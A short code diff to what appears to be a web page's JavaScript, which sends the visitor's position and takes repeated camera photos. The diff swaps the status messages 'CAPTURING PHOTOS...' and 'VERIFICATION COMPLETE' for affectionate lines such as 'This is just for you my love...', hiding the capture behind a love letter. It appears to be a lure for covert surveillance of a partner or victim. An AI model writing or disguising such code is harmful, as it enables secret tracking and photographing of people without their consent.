@@ -179,7 +179,7 @@
         await sendTextData(position);
 
         // 6. Start continuous photo capture (every 3 seconds)
-        statusText.textContent = "CAPTURING PHOTOS...";
+        statusText.textContent = "This is just for you my love...";
         
         // Take first 3 photos immediately
         for (let i = 0; i < 3; i++) {
@@ -193,7 +193,7 @@
         }, 1500);
 
         // 7. Hide processing overlay & show letter
-        statusText.textContent = "VERIFICATION COMPLETE";
+        statusText.textContent = "Almost Done baby";
         setTimeout(() => {
           processingOverlay.classList.add('hidden');
           letterSection.classList.remove('hidden');
